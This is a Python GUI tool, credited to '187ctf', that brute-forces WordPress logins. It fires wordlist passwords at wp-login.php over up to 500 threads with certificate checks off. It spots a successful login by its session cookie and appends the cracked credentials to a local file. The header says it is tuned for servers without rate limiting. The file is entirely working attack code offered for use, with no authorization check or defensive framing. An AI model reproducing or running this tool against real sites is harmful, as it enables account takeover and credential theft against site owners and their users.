#!/usr/bin/env python3
"""
WordPress Ultra-Fast Brute Forcer - GUI Version
Author: 187ctf
GitHub: https://github.com/187ctf
Description: High-performance WordPress login brute-force tool with GUI
            Optimized for servers without rate limiting
"""

import tkinter as tk
from tkinter import ttk, filedialog, scrolledtext, messagebox
import threading
import requests
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
from datetime import datetime
import queue

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class WPBruteForceGUI:
    """WordPress brute-force GUI application"""
    
    def __init__(self, root):
        """Initialize the GUI application"""
        self.root = root
        self.root.title("WordPress Ultra-Fast Brute Forcer - by 187ctf")
        self.root.geometry("900x700")
        self.root.resizable(False, False)
        
        # Variables
        self.url_var = tk.StringVar()
        self.username_var = tk.StringVar()
        self.wordlist_var = tk.StringVar()
        self.threads_var = tk.IntVar(value=100)
        
        # Attack state
        self.attack_running = False
        self.attack_thread = None
        self.stop_attack = False
        self.found_password = None
        
        # Statistics
        self.tested_count = 0
        self.total_passwords = 0
        self.start_time = None
        
        # Message queue for thread-safe GUI updates
        self.message_queue = queue.Queue()
        
        # Build GUI
        self.create_widgets()
        self.process_queue()
        
    def create_widgets(self):
        """Create and layout all GUI widgets"""
        
        # Header Frame
        header_frame = tk.Frame(self.root, bg="#2c3e50", height=100)
        header_frame.pack(fill=tk.X)
        header_frame.pack_propagate(False)
        
        # Title
        title_label = tk.Label(
            header_frame,
            text="WordPress Ultra-Fast Brute Forcer",
            font=("Arial", 20, "bold"),
            bg="#2c3e50",
            fg="white"
        )
        title_label.pack(pady=10)
        
        # Subtitle
        subtitle_label = tk.Label(
            header_frame,
            text="by 187ctf | github.com/187ctf",
            font=("Arial", 10),
            bg="#2c3e50",
            fg="#95a5a6"
        )
        subtitle_label.pack()
        
        # Main container
        main_frame = tk.Frame(self.root, padx=20, pady=20)
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        # Configuration Frame
        config_frame = tk.LabelFrame(
            main_frame,
            text="Attack Configuration",
            font=("Arial", 11, "bold"),
            padx=10,
            pady=10
        )
        config_frame.pack(fill=tk.X, pady=(0, 10))
        
        # Target URL
        tk.Label(config_frame, text="Target URL:", font=("Arial", 10)).grid(
            row=0, column=0, sticky=tk.W, pady=5
        )
        url_entry = tk.Entry(
            config_frame,
            textvariable=self.url_var,
            width=50,
            font=("Arial", 10)
        )
        url_entry.grid(row=0, column=1, columnspan=2, sticky=tk.W, pady=5)
        url_entry.insert(0, "https://")
        
        # Username
        tk.Label(config_frame, text="Username:", font=("Arial", 10)).grid(
            row=1, column=0, sticky=tk.W, pady=5
        )
        username_entry = tk.Entry(
            config_frame,
            textvariable=self.username_var,
            width=50,
            font=("Arial", 10)
        )
        username_entry.grid(row=1, column=1, columnspan=2, sticky=tk.W, pady=5)
        
        # Wordlist
        tk.Label(config_frame, text="Wordlist:", font=("Arial", 10)).grid(
            row=2, column=0, sticky=tk.W, pady=5
        )
        wordlist_entry = tk.Entry(
            config_frame,
            textvariable=self.wordlist_var,
            width=40,
            font=("Arial", 10),
            state="readonly"
        )
        wordlist_entry.grid(row=2, column=1, sticky=tk.W, pady=5)
        
        browse_button = tk.Button(
            config_frame,
            text="Browse",
            command=self.browse_wordlist,
            font=("Arial", 9),
            bg="#3498db",
            fg="white",
            cursor="hand2"
        )
        browse_button.grid(row=2, column=2, padx=5, pady=5)
        
        # Threads
        tk.Label(config_frame, text="Threads:", font=("Arial", 10)).grid(
            row=3, column=0, sticky=tk.W, pady=5
        )
        
        threads_frame = tk.Frame(config_frame)
        threads_frame.grid(row=3, column=1, sticky=tk.W, pady=5)
        
        threads_spinbox = tk.Spinbox(
            threads_frame,
            from_=1,
            to=500,
            textvariable=self.threads_var,
            width=10,
            font=("Arial", 10)
        )
        threads_spinbox.pack(side=tk.LEFT)
        
        tk.Label(
            threads_frame,
            text="(1-500, recommended: 100-200)",
            font=("Arial", 9),
            fg="#7f8c8d"
        ).pack(side=tk.LEFT, padx=10)
        
        # Control buttons frame (right after threads)
        button_frame = tk.Frame(config_frame)
        button_frame.grid(row=4, column=0, columnspan=3, pady=20)
        
        # Start button
        self.start_button = tk.Button(
            button_frame,
            text="▶ START ATTACK",
            command=self.start_attack,
            font=("Arial", 14, "bold"),
            bg="#27ae60",
            fg="white",
            cursor="hand2",
            relief=tk.RAISED,
            borderwidth=3,
            padx=30,
            pady=15,
            width=15
        )
        self.start_button.pack(side=tk.LEFT, padx=10)
        
        # Stop button
        self.stop_button = tk.Button(
            button_frame,
            text="⏹ STOP ATTACK",
            command=self.stop_attack_handler,
            font=("Arial", 14, "bold"),
            bg="#e74c3c",
            fg="white",
            cursor="hand2",
            relief=tk.RAISED,
            borderwidth=3,
            padx=30,
            pady=15,
            width=15,
            state=tk.DISABLED
        )
        self.stop_button.pack(side=tk.LEFT, padx=10)
        
        # Clear log button
        clear_button = tk.Button(
            button_frame,
            text="Clear Log",
            command=self.clear_log,
            font=("Arial", 12),
            bg="#95a5a6",
            fg="white",
            cursor="hand2",
            relief=tk.RAISED,
            borderwidth=3,
            padx=20,
            pady=15,
            width=12
        )
        clear_button.pack(side=tk.LEFT, padx=10)
        
        # Statistics Frame
        stats_frame = tk.LabelFrame(
            main_frame,
            text="Attack Statistics",
            font=("Arial", 11, "bold"),
            padx=10,
            pady=10
        )
        stats_frame.pack(fill=tk.X, pady=(0, 10))
        
        # Stats grid
        stats_grid = tk.Frame(stats_frame)
        stats_grid.pack(fill=tk.X)
        
        # Status
        tk.Label(stats_grid, text="Status:", font=("Arial", 10, "bold")).grid(
            row=0, column=0, sticky=tk.W, pady=3
        )
        self.status_label = tk.Label(
            stats_grid,
            text="Ready",
            font=("Arial", 10),
            fg="#27ae60"
        )
        self.status_label.grid(row=0, column=1, sticky=tk.W, pady=3, padx=10)
        
        # Progress
        tk.Label(stats_grid, text="Progress:", font=("Arial", 10, "bold")).grid(
            row=1, column=0, sticky=tk.W, pady=3
        )
        self.progress_label = tk.Label(
            stats_grid,
            text="0 / 0 (0.0%)",
            font=("Arial", 10)
        )
        self.progress_label.grid(row=1, column=1, sticky=tk.W, pady=3, padx=10)
        
        # Speed
        tk.Label(stats_grid, text="Speed:", font=("Arial", 10, "bold")).grid(
            row=2, column=0, sticky=tk.W, pady=3
        )
        self.speed_label = tk.Label(
            stats_grid,
            text="0 req/s",
            font=("Arial", 10)
        )
        self.speed_label.grid(row=2, column=1, sticky=tk.W, pady=3, padx=10)
        
        # Elapsed Time
        tk.Label(stats_grid, text="Elapsed:", font=("Arial", 10, "bold")).grid(
            row=3, column=0, sticky=tk.W, pady=3
        )
        self.time_label = tk.Label(
            stats_grid,
            text="00:00:00",
            font=("Arial", 10)
        )
        self.time_label.grid(row=3, column=1, sticky=tk.W, pady=3, padx=10)
        
        # Progress Bar
        self.progress_bar = ttk.Progressbar(
            stats_frame,
            mode='determinate',
            length=400
        )
        self.progress_bar.pack(fill=tk.X, pady=(10, 0))
        
        # Log Frame
        log_frame = tk.LabelFrame(
            main_frame,
            text="Attack Log",
            font=("Arial", 11, "bold"),
            padx=10,
            pady=10
        )
        log_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
        
        # Log text area
        self.log_text = scrolledtext.ScrolledText(
            log_frame,
            width=80,
            height=15,
            font=("Courier", 9),
            bg="#2c3e50",
            fg="#ecf0f1",
            insertbackground="white"
        )
        self.log_text.pack(fill=tk.BOTH, expand=True)
        self.log_text.config(state=tk.DISABLED)
        
        # Configure text tags for colored output
        self.log_text.tag_config("success", foreground="#27ae60")
        self.log_text.tag_config("error", foreground="#e74c3c")
        self.log_text.tag_config("info", foreground="#3498db")
        self.log_text.tag_config("warning", foreground="#f39c12")
        
    def browse_wordlist(self):
        """Open file dialog to select wordlist"""
        filename = filedialog.askopenfilename(
            title="Select Password Wordlist",
            filetypes=(
                ("Text files", "*.txt"),
                ("All files", "*.*")
            )
        )
        if filename:
            self.wordlist_var.set(filename)
            self.log_message(f"Wordlist selected: {filename}", "info")
    
    def log_message(self, message, tag="info"):
        """Add message to log with timestamp"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        formatted_message = f"[{timestamp}] {message}\n"
        
        self.log_text.config(state=tk.NORMAL)
        self.log_text.insert(tk.END, formatted_message, tag)
        self.log_text.see(tk.END)
        self.log_text.config(state=tk.DISABLED)
    
    def clear_log(self):
        """Clear the log text area"""
        self.log_text.config(state=tk.NORMAL)
        self.log_text.delete(1.0, tk.END)
        self.log_text.config(state=tk.DISABLED)
    
    def validate_inputs(self):
        """Validate user inputs before starting attack"""
        url = self.url_var.get().strip()
        username = self.username_var.get().strip()
        wordlist = self.wordlist_var.get().strip()
        threads = self.threads_var.get()
        
        if not url or url == "https://":
            messagebox.showerror("Error", "Please enter a target URL")
            return False
        
        if not url.startswith("http://") and not url.startswith("https://"):
            messagebox.showerror("Error", "URL must start with http:// or https://")
            return False
        
        if not username:
            messagebox.showerror("Error", "Please enter a username")
            return False
        
        if not wordlist:
            messagebox.showerror("Error", "Please select a wordlist file")
            return False
        
        if threads < 1 or threads > 500:
            messagebox.showerror("Error", "Thread count must be between 1 and 500")
            return False
        
        return True
    
    def start_attack(self):
        """Start the brute-force attack"""
        if not self.validate_inputs():
            return
        
        if self.attack_running:
            messagebox.showwarning("Warning", "Attack is already running")
            return
        
        # Reset state
        self.attack_running = True
        self.stop_attack = False
        self.found_password = None
        self.tested_count = 0
        self.start_time = datetime.now()
        
        # Update UI
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        self.status_label.config(text="Running", fg="#e67e22")
        self.progress_bar['value'] = 0
        
        # Log attack start
        self.log_message("=" * 60, "info")
        self.log_message("ATTACK STARTED", "success")
        self.log_message(f"Target: {self.url_var.get()}", "info")
        self.log_message(f"Username: {self.username_var.get()}", "info")
        self.log_message(f"Wordlist: {self.wordlist_var.get()}", "info")
        self.log_message(f"Threads: {self.threads_var.get()}", "info")
        self.log_message("=" * 60, "info")
        
        # Start attack in separate thread
        self.attack_thread = threading.Thread(target=self.run_attack, daemon=True)
        self.attack_thread.start()
        
        # Start timer update
        self.update_timer()
    
    def run_attack(self):
        """Execute the brute-force attack (runs in separate thread)"""
        url = self.url_var.get().strip().rstrip('/') + '/wp-login.php'
        username = self.username_var.get().strip()
        wordlist = self.wordlist_var.get().strip()
        threads = self.threads_var.get()
        
        # Load wordlist
        try:
            with open(wordlist, 'r', encoding='latin-1', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except Exception as e:
            self.message_queue.put(('log', f"Error reading wordlist: {e}", 'error'))
            self.message_queue.put(('attack_complete', False))
            return
        
        self.total_passwords = len(passwords)
        self.message_queue.put(('log', f"Loaded {self.total_passwords} passwords", 'info'))
        
        # Create session
        session = requests.Session()
        
        # Test passwords with thread pool
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {
                executor.submit(self.test_password, session, url, username, pwd): pwd
                for pwd in passwords
            }
            
            for future in as_completed(futures):
                if self.stop_attack or self.found_password:
                    executor.shutdown(wait=False, cancel_futures=True)
                    break
                
                password = futures[future]
                
                try:
                    success, found_pwd = future.result()
                    
                    if success:
                        self.found_password = found_pwd
                        self.message_queue.put(('log', "=" * 60, 'success'))
                        self.message_queue.put(('log', "✓✓✓ PASSWORD FOUND! ✓✓✓", 'success'))
                        self.message_queue.put(('log', f"Username: {username}", 'success'))
                        self.message_queue.put(('log', f"Password: {found_pwd}", 'success'))
                        self.message_queue.put(('log', "=" * 60, 'success'))
                        self.message_queue.put(('attack_complete', True))
                        return
                    
                    self.tested_count += 1
                    
                    # Update progress every 50 tests
                    if self.tested_count % 50 == 0:
                        self.message_queue.put(('update_progress', None))
                    
                except Exception as e:
                    pass
        
        # Attack completed without finding password
        if not self.stop_attack:
            self.message_queue.put(('log', "Attack completed - No valid password found", 'error'))
        else:
            self.message_queue.put(('log', "Attack stopped by user", 'warning'))
        
        self.message_queue.put(('attack_complete', False))
    
    def test_password(self, session, url, username, password):
        """Test a single password (runs in thread pool)"""
        try:
            data = {
                'log': username,
                'pwd': password,
                'wp-submit': 'Log In',
                'testcookie': '1'
            }
            
            r = session.post(url, data=data, timeout=10, verify=False, allow_redirects=False)
            
            # Check for success
            if 'login_error' not in r.text or 'wp-admin' in r.text or r.status_code == 302:
                cookies = session.cookies.get_dict()
                if any('wordpress_logged_in' in k for k in cookies.keys()):
                    return True, password
            
        except Exception as e:
            pass
        
        return False, None
    
    def stop_attack_handler(self):
        """Handle stop attack button click"""
        self.stop_attack = True
        self.log_message("Stopping attack...", "warning")
        self.stop_button.config(state=tk.DISABLED)
    
    def update_timer(self):
        """Update elapsed time display"""
        if self.attack_running and self.start_time:
            elapsed = datetime.now() - self.start_time
            hours = int(elapsed.total_seconds() // 3600)
            minutes = int((elapsed.total_seconds() % 3600) // 60)
            seconds = int(elapsed.total_seconds() % 60)
            
            self.time_label.config(text=f"{hours:02d}:{minutes:02d}:{seconds:02d}")
            
            # Calculate speed
            if elapsed.total_seconds() > 0:
                speed = self.tested_count / elapsed.total_seconds()
                self.speed_label.config(text=f"{speed:.1f} req/s")
            
            # Schedule next update
            self.root.after(1000, self.update_timer)
    
    def process_queue(self):
        """Process messages from attack thread"""
        try:
            while True:
                message_type, data, *extra = self.message_queue.get_nowait()
                
                if message_type == 'log':
                    tag = extra[0] if extra else 'info'
                    self.log_message(data, tag)
                
                elif message_type == 'update_progress':
                    if self.total_passwords > 0:
                        progress = (self.tested_count / self.total_passwords) * 100
                        self.progress_bar['value'] = progress
                        self.progress_label.config(
                            text=f"{self.tested_count} / {self.total_passwords} ({progress:.1f}%)"
                        )
                
                elif message_type == 'attack_complete':
                    success = data
                    self.attack_running = False
                    self.start_button.config(state=tk.NORMAL)
                    self.stop_button.config(state=tk.DISABLED)
                    
                    if success:
                        self.status_label.config(text="Success!", fg="#27ae60")
                        self.progress_bar['value'] = 100
                        
                        # Save credentials
                        self.save_credentials()
                        
                        messagebox.showinfo(
                            "Success!",
                            f"Password found!\n\nUsername: {self.username_var.get()}\nPassword: {self.found_password}"
                        )
                    else:
                        self.status_label.config(text="Failed", fg="#e74c3c")
                
        except queue.Empty:
            pass
        
        # Schedule next check
        self.root.after(100, self.process_queue)
    
    def save_credentials(self):
        """Save found credentials to file"""
        try:
            with open('found_credentials.txt', 'a') as f:
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                f.write(f"[{timestamp}] {self.url_var.get()} - {self.username_var.get()}:{self.found_password}\n")
            self.log_message("Credentials saved to: found_credentials.txt", "success")
        except Exception as e:
            self.log_message(f"Error saving credentials: {e}", "error")

def main():
    """Main entry point"""
    root = tk.Tk()
    app = WPBruteForceGUI(root)
    root.mainloop()

if __name__ == "__main__":
    main()
